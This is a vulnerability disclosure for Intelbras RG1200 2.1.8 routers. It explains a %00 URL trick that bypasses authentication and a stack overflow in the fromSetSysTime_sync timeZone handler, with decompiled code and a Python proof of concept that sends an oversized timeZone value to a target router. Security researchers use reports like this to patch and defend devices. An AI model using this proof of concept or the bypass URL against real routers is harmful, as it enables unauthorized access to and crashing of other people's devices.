# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`fromSetSysTime_sync`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`fromSetSysTime_sync`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Remote unauthenticated attackers can bypass authentication by crafting a URL containing `%00` and a whitelisted substring (e.g., `img/main-logo.png`) in the raw URL so that the security handler matches the whitelist while the form dispatcher resolves the decoded/truncated path to a protected `/goform` handler.

After authentication bypass, an attacker can trigger a stack buffer overflow in `fromSetSysTime_sync`. The handler processes the user-controlled `timeZone` value and either parses it via unbounded `sscanf` or copies it via `strcpy` into fixed-size stack buffers.

## POC

```py
import requests
import sys


def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
  base = f"http://{target_ip}:{port}"
  url = f"{base}/goform/fromSetSysTime_sync"

  data = {
    "timeZone": "A"*100,
    "timePeriod": "60",
    "ntpServer": "time.windows.com",
  }

  headers = {
    "Cookie": cookie,
  }

  r = requests.post(url, data=data, headers=headers, timeout=10)
  print("status:", r.status_code)
  print(r.text[:2000])


if __name__ == "__main__":
  if len(sys.argv) < 2:
    print("usage: python poc.py <target_ip> [port]")
    sys.exit(1)
  ip = sys.argv[1]
  port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
  exploit(ip, port=port)
```

## Cause Analysis

### 1. Authentication Bypass — Raw URL vs Decoded Path Inconsistency

The HTTP request parsing logic in `websParseFirst` (0x42ea1c) stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` → `websUrlParse`:

```c
// websParseFirst (0x42ea1c) — sets wp->url = raw, wp->path = decoded
int __cdecl websParseFirst(webs_t wp, char_t *text)
{
    url = strtok(0, " \t\n");                         // raw URL from HTTP request line
    if ( websUrlParse(url, &buf, &host, &path, &port, &query, &proto, 0, &ext) >= 0 )
    {
        wp->url = bstrdup(url);      // ← raw URL, NOT decoded
        wp->path = bstrdup(path);    // ← decoded path from websDecodeUrl
        // ...
    }
}
```

In `R7WebsSecurityHandler` (0x434c34), the whitelist check is performed using `strstr(url, ...)` on the **raw** `url` parameter (which is `wp->url`). By crafting a raw URL such as `/goform/fromSetSysTime_sync%00img/main-logo.png`, the security handler matches the whitelisted substring and returns 0 (allow) without enforcing authentication:

```c
// R7WebsSecurityHandler (0x434c34) — whitelist check on raw URL
if ( !strncmp(url, "/public/", 8u)
  || !strncmp(url, "/lang/", 6u)
  || strstr(url, "img/main-logo.png")    // ← BYPASS: matches %00img/main-logo.png in raw URL
  || strstr(url, "reasy-ui-1.0.3.js")
  // ...
{
    return 0;  // ← Authentication bypassed
}
```

Meanwhile, `websDecodeUrl` (0x430ebc) decodes `%00` to a null byte, causing `websFormHandler` (0x415710) to receive the **decoded** path `/goform/fromSetSysTime_sync` and dispatch to the handler.

### 2. Stack Buffer Overflow — Unbounded sscanf and strcpy in fromSetSysTime_sync

`fromSetSysTime_sync` (0x496564) obtains `timezone = websGetVar(wp, "timeZone", ...)` and has two overflow paths depending on whether the value contains `:`:

```c
// fromSetSysTime_sync (0x496564)
cgi_msg __cdecl fromSetSysTime_sync(webs_t wp)
{
    const char *timezone;
    char_t timezone_buf[16];        // ← 16-byte stack buffer
    char_t timezone_min_buf[16];    // ← 16-byte stack buffer

    strcpy(timezone_buf, "0");
    strcpy(timezone_min_buf, "0");
    timezone = websGetVar(wp, "timeZone", byte_4F0514);
    // ...
    if ( strchr(timezone, 58) )     // if timezone contains ':'
    {
        sscanf(timezone, "%[^:]:%s", timezone_buf, timezone_min_buf);  // ← OVERFLOW: unbounded into 16-byte buffers
    }
    else
    {
        strcpy(timezone_buf, timezone);    // ← OVERFLOW: no length check, copies into 16-byte buffer
        strcpy(timezone_min_buf, "0");
    }
    SetValue("sys.timezone", timezone_buf);
    SetValue("sys.timenextzone", timezone_min_buf);
    // ...
}
```

**Path A** (`timeZone` contains `:`): `sscanf` with format `"%[^:]:%s"` has no width limits. A 100-byte `timeZone` like `"A" * 100` overflows `timezone_buf`.

**Path B** (`timeZone` without `:`): `strcpy(timezone_buf, timezone)` copies the full user input into the 16-byte buffer with no length validation.




